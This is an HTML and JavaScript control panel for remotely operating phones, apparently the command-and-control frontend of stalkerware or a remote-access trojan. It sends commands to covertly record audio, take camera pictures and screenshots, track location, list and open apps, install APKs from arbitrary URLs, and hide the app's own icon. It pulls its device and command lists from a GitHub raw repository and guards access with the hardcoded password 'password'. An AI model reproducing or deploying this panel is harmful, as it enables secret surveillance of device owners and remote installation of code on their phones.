<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
    <style>
        :root {
            --primary-color: #4361ee;
            --primary-dark: #3a56d4;
            --secondary-color: #3f37c9;
            --background: #f8f9fa;
            --card-bg: #ffffff;
            --text-color: #333333;
            --text-light: #6c757d;
            --success-color: #4bb543;
            --error-color: #ff3333;
            --warning-color: #ff9500;
            --border-radius: 12px;
            --box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
            --transition: all 0.3s ease;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Roboto, -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: var(--background);
            color: var(--text-color);
            line-height: 1.6;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 800px;
            background: var(--card-bg);
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            overflow: hidden;
            transition: var(--transition);
        }
        .header {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header h2 { margin: 0; font-weight: 600; }
        .content { padding: 25px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: 500; color: var(--text-color); }
        select, input, button {
            width: 100%;
            padding: 12px 15px;
            border-radius: var(--border-radius);
            border: 1px solid #ddd;
            font-size: 16px;
            transition: var(--transition);
            background-color: white;
        }
        select:focus, input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
        }
        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            cursor: pointer;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        button:hover { background-color: var(--primary-dark); }
        button:disabled { background-color: #adb5bd; cursor: not-allowed; }
        .button-group { display: flex; gap: 12px; margin-top: 20px; }
        .button-group button { flex: 1; }
        .status-log {
            margin-top: 20px;
            padding: 15px;
            border-radius: var(--border-radius);
            word-wrap: break-word;
            text-align: left;
            font-weight: 500;
        }
        .log-info { background-color: #e7f1ff; color: #004085; border-left: 4px solid var(--primary-color); }
        .log-success { background-color: #d4edda; color: #155724; border-left: 4px solid var(--success-color); }
        .log-error { background-color: #f8d7da; color: #721c24; border-left: 4px solid var(--error-color); }
        .data-panel { margin-top: 20px; background: #f8f9fa; padding: 20px; border-radius: var(--border-radius); border: 1px solid #e9ecef; }
        .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
        .data-item { background: white; padding: 10px; border-radius: 6px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
        .data-label { font-weight: 600; color: var(--text-light); font-size: 14px; margin-bottom: 5px; }
        .data-value { color: var(--text-color); font-weight: 500; font-size: 16px; word-break: break-all; }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .modal-content { background-color: var(--card-bg); padding: 25px; border-radius: var(--border-radius); width: 90%; max-width: 600px; max-height: 90vh; overflow-y: auto; display: flex; flex-direction: column; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #eee; }
        .modal-header h3 { margin: 0; color: var(--primary-color); }
        .close-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-light); width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; border-radius: 50%; }
        .close-btn:hover { background-color: #f1f1f1; }
        #visualizer { width: 100%; height: 350px; background-color: #e9ecef; border-radius: 8px; margin: 10px 0; position: relative; overflow: hidden; }
        .position-analysis { background: #e7f1ff; border-radius: var(--border-radius); padding: 15px; margin-top: 15px; text-align: center; border: 1px solid #b8d0ff; }
        .position-analysis h4 { font-size: 16px; color: var(--primary-dark); margin: 0; }
        #app-list-container { max-height: 60vh; overflow-y: auto; margin-top: 15px; }
        .app-list-header { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-weight: 600; position: sticky; top: 0; background: white; z-index: 1; }
        .app-item { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f5f5f5; align-items: center; cursor: pointer; }
        .app-item:hover { background-color: #f8f9fa; }
        .app-name { font-weight: 500; flex: 2; }
        .app-package { font-size: 12px; color: var(--text-light); flex: 3; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .search-box { margin-bottom: 15px; }
        #password-view { padding: 30px; text-align: center; }
        #password-view h2 { margin-bottom: 20px; color: var(--primary-color); }
        #password-view input { margin-bottom: 15px; }
        #admin-panel-view { display: none; }
        .loading-spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .tab-container { display: flex; margin-bottom: 20px; border-bottom: 1px solid #eee; }
        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 3px solid transparent; font-weight: 500; transition: var(--transition); }
        .tab.active { border-bottom-color: var(--primary-color); color: var(--primary-color); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .control-group { border: 1px solid #eee; border-radius: var(--border-radius); padding: 20px; margin-bottom: 20px; }
        .control-group h3 { margin-top: 0; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        .input-with-button { display: flex; gap: 10px; margin-top: 10px; }
        .input-with-button input { flex-grow: 1; }
        .input-with-button button { flex-shrink: 0; width: auto; }
        #image-display { max-width: 100%; height: auto; border-radius: 8px; margin-top: 15px; }
        .slider-group { display: flex; align-items: center; gap: 15px; }
        .slider-group input[type="range"] { flex-grow: 1; }
        .slider-group span { font-weight: 500; min-width: 30px; text-align: center; }
    </style>
</head>
<body>
    
    <div class="container">
        <div id="password-view">
            <h2>Enter Admin Password</h2>
            <input type="password" id="ui-password-input" placeholder="Enter UI Password" onkeyup="if(event.key === 'Enter') checkUiPassword();">
            <button onclick="checkUiPassword()">Unlock Dashboard</button>
        </div>

        <div id="admin-panel-view">
            <div class="header">
                <h2>Device Management Dashboard</h2>
            </div>

            <div class="content">
                <div class="tab-container">
                    <div class="tab active" onclick="switchTab('control-tab')">Control</div>
                    <div class="tab" onclick="switchTab('data-tab')">Device Data</div>
                    <div class="tab" onclick="switchTab('media-tab')">Media</div>
                    <div class="tab" onclick="switchTab('apps-tab')">Apps</div>
                    <div class="tab" onclick="switchTab('camera-tab')">Camera</div>
                </div>

                <div id="control-tab" class="tab-content active">
                     <div class="control-group">
                        <h3>Main Controls</h3>
                        <div class="form-group">
                            <label for="device-dropdown">Select Device</label>
                            <select id="device-dropdown" onchange="onDeviceSelected()">
                                <option value="">-- Loading Devices --</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="action-dropdown">Select Command</label>
                            <select id="action-dropdown">
                                <option value="">-- Loading Commands --</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="backend-password">API Password</label>
                            <input type="password" id="backend-password" placeholder="Enter Backend API Password">
                        </div>
                        <button id="send-button" onclick="sendCommandFromDropdown()">Send Command</button>
                    </div>
                    <div id="status-log" class="status-log log-info">Awaiting command...</div>
                </div>

                <div id="data-tab" class="tab-content">
                    <div class="data-panel">
                        <div class="data-grid">
                            <div class="data-item"><div class="data-label">Screen Status</div><div class="data-value" id="data-screen">--</div></div>
                            <div class="data-item"><div class="data-label">Battery Level</div><div class="data-value" id="data-battery">--</div></div>
                            <div class="data-item"><div class="data-label">Charging Status</div><div class="data-value" id="data-charging">--</div></div>
                            <div class="data-item"><div class="data-label">Location</div><div class="data-value" id="data-location">--</div></div>
                            <div class="data-item"><div class="data-label">Current App</div><div class="data-value" id="data-current-app">--</div></div>
                            <div class="data-item"><div class="data-label">Proximity</div><div class="data-value" id="data-proximity">--</div></div>
                            <div class="data-item"><div class="data-label">Light Level</div><div class="data-value" id="data-light">--</div></div>
                            <!-- NEW/CORRECTED: Added separate containers for picture and screenshot for clarity -->
                            <div class="data-item"><div class="data-label">Last Screenshot</div><div class="data-value" id="data-screenshot">--</div></div>
                            <div class="data-item"><div class="data-label">Last Picture</div><div class="data-value" id="data-picture">--</div></div>
                            <div class="data-item"><div class="data-label">Last Recording</div><div class="data-value" id="data-recording">--</div></div>
                        </div>
                    </div>
                    <div class="button-group">
                        <button id="refresh-btn" onclick="forceRefresh()"><span id="refresh-text">Refresh Data</span><span id="refresh-spinner" class="loading-spinner" style="display: none;"></span></button>
                        <button id="visualize-btn" onclick="showModal('visualizer-modal')" disabled>Visualize Orientation</button>
                        <button id="apps-btn" onclick="showAppListModal()">View Installed Apps</button>
                    </div>
                </div>

                <div id="media-tab" class="tab-content">
                    <div class="control-group">
                        <h3>Audio Control</h3>
                         <div class="button-group">
                           <button onclick="sendCommandWithValue('start_rec')">Start Recording</button>
                           <button onclick="sendCommandWithValue('stop_rec')">Stop Recording</button>
                        </div>
                        <br>
                        <div class="input-with-button">
                            <input type="text" id="sound-url-input" placeholder="https://example.com/sound.mp3">
                            <button onclick="playSound()">Play Sound</button>
                        </div>
                    </div>
                     <div class="control-group">
                        <h3>Volume Control</h3>
                        <div class="slider-group">
                            <input type="range" id="volume-slider" min="0" max="100" value="50" oninput="document.getElementById('volume-value').textContent = this.value">
                            <span id="volume-value">50</span>
                        </div>
                         <div class="button-group">
                           <button onclick="setVolume()">Set Volume</button>
                        </div>
                    </div>
                </div>
                
                <div id="apps-tab" class="tab-content">
                    <div class="control-group">
                        <h3>Application Management</h3>
                        <div class="input-with-button">
                             <input type="text" id="app-url-input" placeholder="https://example.com/app.apk">
                            <button onclick="installApp()">Install App</button>
                        </div>
                        <br>
                        <div class="input-with-button">
                            <input type="text" id="app-package-input" placeholder="com.example.app">
                            <button onclick="uninstallApp()">Uninstall App</button>
                        </div>
                    </div>
                     <div class="control-group">
                        <h3>App Visibility</h3>
                         <div class="button-group">
                           <button onclick="sendCommandWithValue('toggle_icon', { show: false })">Hide App Icon</button>
                           <button onclick="sendCommandWithValue('toggle_icon', { show: true })">Show App Icon</button>
                        </div>
                    </div>
                </div>

                <div id="camera-tab" class="tab-content">
                     <div class="control-group">
                        <h3>Screen & Camera</h3>
                        <div class="button-group">
                           <button onclick="sendCommandWithValue('screenshot')">Request Screenshot</button>
                           <button onclick="takePicture(0)">Take Pic (Cam 1)</button>
                           <button onclick="takePicture(1)">Take Pic (Cam 2)</button>
                        </div>
                    </div>
                     <div class="control-group">
                        <h3>Show Image on Screen</h3>
                        <div class="input-with-button">
                             <input type="text" id="image-url-input" placeholder="https://example.com/image.jpg">
                            <button onclick="showImage()">Show Image</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modals -->
    <div id="app-list-modal" class="modal" onclick="hideModal('app-list-modal')"><div class="modal-content" onclick="event.stopPropagation()"><div class="modal-header"><h3>Installed Applications</h3><button class="close-btn" onclick="hideModal('app-list-modal')">&times;</button></div><div class="search-box"><input type="text" id="app-search" placeholder="Search applications..." onkeyup="filterApps()"></div><div class="app-list-header"><div class="app-name">Application Name</div><div class="app-package">Package Name</div></div><div id="app-list-container"></div></div></div>
    <div id="visualizer-modal" class="modal" onclick="hideModal('visualizer-modal')"><div class="modal-content" onclick="event.stopPropagation()"><div class="modal-header"><h3>Contextual Device Visualization</h3><button class="close-btn" onclick="hideModal('visualizer-modal')">&times;</button></div><div id="visualizer"></div><div class="position-analysis"><h4>Position Analysis: <span id="position-status">--</span></h4></div><p style="text-align:center; font-size:12px; margin-top:15px; color:var(--text-light);">Click and drag to rotate view. Scroll to zoom.</p></div></div>
    <div id="image-modal" class="modal" onclick="hideModal('image-modal')"><div class="modal-content" onclick="event.stopPropagation()"><div class="modal-header"><h3 id="image-modal-title">Image</h3><button class="close-btn" onclick="hideModal('image-modal')">&times;</button></div><img id="image-display" src="" alt="Device Capture"></div></div>

    <!-- ==================================================================================== -->
    <!-- ==                              START OF UPDATED SCRIPT                           == -->
    <!-- ==================================================================================== -->
    <script>
        // --- Configuration and Global State ---
        const UI_UNLOCK_PASSWORD = "password";
        const COMMANDS_JSON_URL = "https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/commands.json";
        const DEVICES_JSON_URL = "https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/devices.json";
        let installedApps = {};
        let isAuthenticated = sessionStorage.getItem("isAuthenticated") === "true";
        let scene, camera, renderer, controls, phoneModel, pocketModel, animationFrameId;

        // --- Core Data Handling & Display Logic (REWRITTEN FOR CONSISTENCY) ---
        
        // This function is the new "brain" for displaying all data from get-status
        function parseAndDisplayData(allData) {
            let hasSensorData = false;
            
            // Go through every piece of data received from the server
            for (const dataType in allData) {
                const payload = allData[dataType]; // The payload is the raw data
                if (payload === undefined || payload === null) continue;

                try {
                    switch (dataType) {
                        case "screen_status":
                            safeUpdateElement("data-screen", payload || "N/A");
                            break;
                        case "battery_status":
                            if (payload.percentage !== undefined) {
                                safeUpdateElement("data-battery", `${payload.percentage.toFixed(0)}%`);
                                safeUpdateElement("data-charging", payload.isCharging ? "✅ Charging" : "❌ Not Charging");
                            }
                            break;
                        case "location":
                            if (typeof payload === 'object' && payload.latitude) {
                                safeUpdateElement("data-location", `<a href="https://www.google.com/maps?q=${payload.latitude},${payload.longitude}" target="_blank">View on Map</a>`);
                            } else {
                                safeUpdateElement("data-location", payload || "N/A");
                            }
                            break;
                        case "current_app":
                            safeUpdateElement("data-current-app", payload || "N/A");
                            break;
                        case "proximity":
                            if (payload.distance !== undefined) safeUpdateElement("data-proximity", `${payload.distance} cm`);
                            hasSensorData = true;
                            break;
                        case "light":
                            if (payload.lux !== undefined) safeUpdateElement("data-light", `${payload.lux.toFixed(1)} lux`);
                            hasSensorData = true;
                            break;
                        case "screenshot":
                        case "picture":
                            const containerId = dataType === 'screenshot' ? 'data-screenshot' : 'data-picture';
                            const container = document.getElementById(containerId);
                            if(container){
                                container.innerHTML = ''; // Clear old content
                                const img = document.createElement('img');
                                img.src = `data:image/jpeg;base64,${payload}`;
                                img.style.cssText = 'max-width: 100%; height: auto; cursor: pointer; border-radius: 6px;';
                                img.onclick = () => {
                                    document.getElementById('image-modal-title').textContent = dataType.charAt(0).toUpperCase() + dataType.slice(1);
                                    document.getElementById('image-display').src = img.src;
                                    showModal('image-modal');
                                };
                                container.appendChild(img);
                            }
                            break;
                        case "last_recording":
                            const audioContainer = document.getElementById('data-recording');
                            if (audioContainer) {
                                audioContainer.innerHTML = '';
                                const audioPlayer = document.createElement('audio');
                                audioPlayer.controls = true;
                                audioPlayer.style.width = '100%';
                                audioPlayer.src = `data:audio/mp3;base64,${payload}`;
                                audioContainer.appendChild(audioPlayer);
                            }
                            break;
                        case "installed_apps":
                            // This case is handled by the fetchAppList logic
                            installedApps = payload;
                            break;
                        default:
                            if (["rotation_vector", "game_rotation_vector", "geomagnetic_rotation_vector", "gravity", "magnetometer"].includes(dataType)) {
                                hasSensorData = true;
                            }
                            break;
                    }
                } catch (e) {
                    console.error(`Error processing display data for ${dataType}:`, e);
                }
            }

            // Enable the visualizer button if we have the necessary data
            document.getElementById("visualize-btn").disabled = !hasSensorData;
            if (hasSensorData) {
                analyzeAndSetPosition(allData);
            }
        }
        
        async function fetchLatestData(dataType = null) {
            const deviceId = document.getElementById("device-dropdown").value;
            if (!deviceId) {
                if (!dataType) updateStatusLog("Please select a device first.", "error");
                return null;
            }

            let url = `/.netlify/functions/get-status?deviceId=${deviceId}`;
            if (dataType) {
                url += `&type=${dataType}`;
            }

            try {
                const response = await fetch(url);
                if (response.status === 404) {
                    if (!dataType) updateStatusLog("No data found for this device yet. Send a command to initialize it.", "warning");
                    return null;
                }
                if (!response.ok) {
                    throw new Error(`Server error: ${response.status}`);
                }
                const data = await response.json();
                return data;
            } catch (error) {
                console.error("Data fetch failed:", error);
                if (!dataType) updateStatusLog(`Failed to fetch device data: ${error.message}`, "error");
                return null;
            }
        }

        async function forceRefresh() {
            const refreshBtn = document.getElementById("refresh-btn");
            const refreshText = document.getElementById("refresh-text");
            const refreshSpinner = document.getElementById("refresh-spinner");

            refreshBtn.disabled = true;
            refreshText.textContent = "Refreshing...";
            refreshSpinner.style.display = "inline-block";
            
            const data = await fetchLatestData();
            if (data) {
                parseAndDisplayData(data);
                updateStatusLog("Device data refreshed successfully.", "success");
            }

            refreshBtn.disabled = false;
            refreshText.textContent = "Refresh Data";
            refreshSpinner.style.display = "none";
        }
        
        async function sendCommandWithValue(action, extraParams = {}) {
            const deviceId = document.getElementById("device-dropdown").value;
            const password = document.getElementById("backend-password").value;
            const sendButton = document.getElementById("send-button");

            if (!deviceId || !action || !password) {
                return updateStatusLog("Error: Device, Action, and Password are required.", "error");
            }
            
            const originalButtonHtml = sendButton.innerHTML;
            sendButton.disabled = true;
            sendButton.innerHTML = '<span class="loading-spinner"></span> Sending...';
            updateStatusLog(`Sending command: ${action}...`, 'info');

            try {
                const body = { deviceId, action, password, ...extraParams };
                const response = await fetch("/.netlify/functions/send-command", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(body)
                });

                const result = await response.json();
                if (!response.ok) throw new Error(result.error || "Unknown server error");
                
                updateStatusLog(`✅ Success: ${result.message}`, "success");
                
                // If it's a command that generates data, auto-refresh after a delay
                if (action.startsWith("get_") || action.startsWith("take_") || ["list_apps", "stop_rec", "screenshot"].includes(action)) {
                    setTimeout(() => forceRefresh(), 2500);
                }

            } catch (error) {
                updateStatusLog(`❌ Error: ${error.message}`, "error");
            } finally {
                sendButton.disabled = false;
                sendButton.innerHTML = originalButtonHtml;
            }
        }

        // --- UI and Command Functions ---
        
        function sendCommandFromDropdown() { sendCommandWithValue(document.getElementById("action-dropdown").value); }
        function playSound() { const url = document.getElementById("sound-url-input").value; if (url) sendCommandWithValue("play", { url }); else updateStatusLog("Please enter a sound URL.", "error"); }
        function showImage() { const url = document.getElementById("image-url-input").value; if (url) sendCommandWithValue("show_image", { url }); else updateStatusLog("Please enter an image URL.", "error"); }
        function setVolume() { const level = document.getElementById("volume-slider").value; sendCommandWithValue("set_volume", { level }); }
        function installApp() { const url = document.getElementById("app-url-input").value; if (url) sendCommandWithValue("install", { url }); else updateStatusLog("Please enter an APK URL.", "error"); }
        function uninstallApp() { const pkg = document.getElementById("app-package-input").value; if (pkg) sendCommandWithValue("uninstall", { package_name: pkg }); else updateStatusLog("Please enter a package name.", "error"); }
        function takePicture(cameraId) { sendCommandWithValue("picture", { camera_id: cameraId }); }

        async function showAppListModal() {
            updateStatusLog("Fetching app list...", "info");
            const data = await fetchLatestData("installed_apps");
            if (data && data.installed_apps) {
                installedApps = data.installed_apps;
                renderAppList();
                showModal("app-list-modal");
                updateStatusLog("App list loaded.", "success");
            } else {
                updateStatusLog("No app list data found for this device.", "warning");
            }
        }

        // --- Helper and Initialization Functions (Largely Unchanged) ---
        
        const safeUpdateElement = (id, htmlContent) => { const el = document.getElementById(id); if (el) el.innerHTML = htmlContent; };
        const updateStatusLog = (message, type = "info") => { const log = document.getElementById("status-log"); log.textContent = message; log.className = `status-log log-${type}`; };
        const switchTab = (tabId) => { document.querySelectorAll(".tab-content").forEach(t => t.classList.remove("active")); document.querySelectorAll(".tab").forEach(t => t.classList.remove("active")); document.getElementById(tabId).classList.add("active"); document.querySelector(`.tab[onclick="switchTab('${tabId}')"]`).classList.add("active"); };
        const showModal = (id) => { document.getElementById(id).style.display = "flex"; if (id === "visualizer-modal" && !animationFrameId) { if (typeof THREE !== 'undefined' && typeof THREE.OrbitControls !== 'undefined') initVisualizer(); else document.getElementById("visualizer").innerHTML = '<p style="color: red; text-align: center; padding-top: 50px;">Error: 3D lib failed.</p>'; }};
        const hideModal = (id) => { if (id === "visualizer-modal") stopAnimationLoop(); document.getElementById(id).style.display = "none"; };
        const onDeviceSelected = () => { document.getElementById("visualize-btn").disabled = true; updateStatusLog("New device selected. Click 'Refresh Data' to fetch its status.", "info"); forceRefresh(); };
        const checkUiPassword = () => { if (document.getElementById("ui-password-input").value === UI_UNLOCK_PASSWORD) { sessionStorage.setItem("isAuthenticated", "true"); isAuthenticated = true; showAdminPanel(); } else { alert("Incorrect password!"); } };
        
        function showAdminPanel() {
            document.getElementById("password-view").style.display = "none";
            document.getElementById("admin-panel-view").style.display = "block";
            if (document.getElementById("device-dropdown").options.length <= 1) {
                populateDropdown("device-dropdown", DEVICES_JSON_URL, "Device");
                populateDropdown("action-dropdown", COMMANDS_JSON_URL, "Command");
            }
        }

        async function populateDropdown(dropdownId, url, type) {
            const select = document.getElementById(dropdownId);
            try {
                const response = await fetch(url);
                if (!response.ok) throw new Error(`Failed to fetch ${type}s`);
                const items = await response.json();
                select.innerHTML = `<option value="">-- Select a ${type} --</option>`;
                items.forEach(item => {
                    select.add(new Option(item.name || item.value, item.id || item.value, false, item.disabled));
                });
            } catch (error) {
                console.error(`Error loading ${type}s:`, error);
                select.innerHTML = `<option value="">-- Error Loading ${type}s --</option>`;
            }
        }

        function renderAppList() {
            const container = document.getElementById("app-list-container");
            if (!container) return;
            container.innerHTML = "";
            const appsArray = Object.entries(installedApps).map(([pkg, name]) => ({ pkg, name }));
            appsArray.sort((a, b) => a.name.localeCompare(b.name));
            
            appsArray.forEach(app => {
                const item = document.createElement("div");
                item.className = "app-item";
                item.onclick = () => sendCommandWithValue("open_app", { package_name: app.pkg });
                item.innerHTML = `<div class="app-name">${app.name}</div><div class="app-package">${app.pkg}</div>`;
                container.appendChild(item);
            });
        }
        
        function filterApps() {
            const filter = document.getElementById("app-search").value.toLowerCase();
            document.querySelectorAll(".app-item").forEach(item => {
                const name = item.querySelector(".app-name").textContent.toLowerCase();
                const pkg = item.querySelector(".app-package").textContent.toLowerCase();
                item.style.display = (name.includes(filter) || pkg.includes(filter)) ? "flex" : "none";
            });
        }

        window.onload = () => {
            if (isAuthenticated) showAdminPanel();
            document.addEventListener("keydown", e => { if (e.key === "Escape") { hideModal("visualizer-modal"); hideModal("app-list-modal"); hideModal("image-modal"); } });
        };
        
        // --- 3D Visualizer Logic (Unchanged) ---
        function initVisualizer(){const e=document.getElementById("visualizer");e&&(e.innerHTML="",scene=new THREE.Scene,scene.background=new THREE.Color(15329769),camera=new THREE.PerspectiveCamera(50,e.clientWidth/e.clientHeight,.1,100),camera.position.set(0,1.6,6),renderer=new THREE.WebGLRenderer({antialias:!0}),renderer.setSize(e.clientWidth,e.clientHeight),renderer.setPixelRatio(window.devicePixelRatio),renderer.shadowMap.enabled=!0,e.appendChild(renderer.domElement),scene.add(new THREE.AmbientLight(16777215,.6)),(e=>{const t=new THREE.DirectionalLight(16777215,.8);t.position.set(5,10,7),t.castShadow=!0,scene.add(t)})(),controls=new THREE.OrbitControls(camera,renderer.domElement),controls.enableDamping=!0,controls.target.set(0,1.2,0),createEnvironment(),createPhoneModel(),startAnimationLoop(),window.addEventListener("resize",onWindowResize))}function createEnvironment(){const e=new THREE.BoxGeometry(5,.15,3),t=new THREE.MeshStandardMaterial({color:11388093}),o=new THREE.Mesh(e,t);o.position.y=0,o.receiveShadow=!0,scene.add(o);const n=new THREE.PlaneGeometry(20,20),a=new THREE.MeshStandardMaterial({color:16314874,roughness:.8}),i=new THREE.Mesh(n,a);i.rotation.x=-Math.PI/2,i.position.y=-.075,i.receiveShadow=!0,scene.add(i);const d=new THREE.BoxGeometry(1,1.8,.5),s=new THREE.MeshStandardMaterial({color:7104157,transparent:!0,opacity:.3,roughness:.7});pocketModel=new THREE.Mesh(d,s),pocketModel.visible=!1,scene.add(pocketModel)}function createPhoneModel(){phoneModel=new THREE.Group;const e=new THREE.BoxGeometry(.8,1.6,.1),t=new THREE.MeshStandardMaterial({color:1703936,metalness:.7,roughness:.3}),o=new THREE.Mesh(e,t);o.castShadow=!0;const n=document.createElement("canvas");n.width=128,n.height=256;const a=n.getContext("2d");a.fillStyle="#222",a.fillRect(0,0,128,256),a.fillStyle="#FFF",a.fillRect(24,240,80,8);const i=new THREE.CanvasTexture(n),d=new THREE.BoxGeometry(.75,1.55,.02),s=new THREE.MeshStandardMaterial({map:i,roughness:.1,metalness:.2}),c=new THREE.Mesh(d,s);c.position.z=.055,phoneModel.add(o,c),scene.add(phoneModel)}
        function analyzeAndSetPosition(data){if(!phoneModel)return;let e=new THREE.Quaternion,t=!1;const o=data.rotation_vector||data.game_rotation_vector||data.geomagnetic_rotation_vector;if(o&&void 0!==o.w)e.set(o.x,o.y,o.z,o.w),t=!0;else if(data.gravity&&data.magnetometer){const n=new THREE.Vector3(data.gravity.x,data.gravity.y,data.gravity.z).normalize(),a=new THREE.Vector3(data.magnetometer.x,data.magnetometer.y,data.magnetometer.z).normalize(),i=a.clone().cross(n).normalize(),d=n.clone().cross(i).normalize(),s=new THREE.Matrix4().makeBasis(i,d,n);e.setFromRotationMatrix(s),t=!0}if(t){const c=new THREE.Quaternion().setFromAxisAngle(new THREE.Vector3(1,0,0),-Math.PI/2);e.multiplyQuaternions(c,e),phoneModel.quaternion.slerp(e,.5)}else phoneModel.quaternion.slerp(new THREE.Quaternion,.5);let l="Undetermined";pocketModel.visible=!1,data.pocket_mode?(l="In Pocket",pocketModel.visible=!0,pocketModel.position.set(0,1.2,0),phoneModel.position.copy(pocketModel.position)):void 0!==data.face_up_down?l=0===data.face_up_down?"On Surface (Face Up)":"On Surface (Face Down)":data.proximity?.distance<2&&data.light?.lux<10?(l="In Pocket / Bag",pocketModel.visible=!0,pocketModel.position.set(0,1.2,0),phoneModel.position.copy(pocketModel.position)):data.proximity?.distance<2?(l="Calling Position",phoneModel.position.set(0,1.3,0)):data.gravity?Math.abs(data.gravity.z)>9?(l="On a Surface",phoneModel.position.set(0,.8,0)):(l="In Hand",phoneModel.position.set(0,1.3,0)):phoneModel.position.set(0,1.3,0),t||"Undetermined"===l||(l+=" (Orientation Unavailable)"),document.getElementById("position-status").textContent=l}
        function startAnimationLoop(){animationFrameId&&cancelAnimationFrame(animationFrameId);const e=()=>{animationFrameId=requestAnimationFrame(e),controls.update(),renderer.render(scene,camera)};e()}function stopAnimationLoop(){animationFrameId&&(cancelAnimationFrame(animationFrameId),animationFrameId=null),window.removeEventListener("resize",onWindowResize)}function onWindowResize(){const e=document.getElementById("visualizer");e&&camera&&renderer&&(camera.aspect=e.clientWidth/e.clientHeight,camera.updateProjectionMatrix(),renderer.setSize(e.clientWidth,e.clientHeight))}
    </script>
</body>
</html>
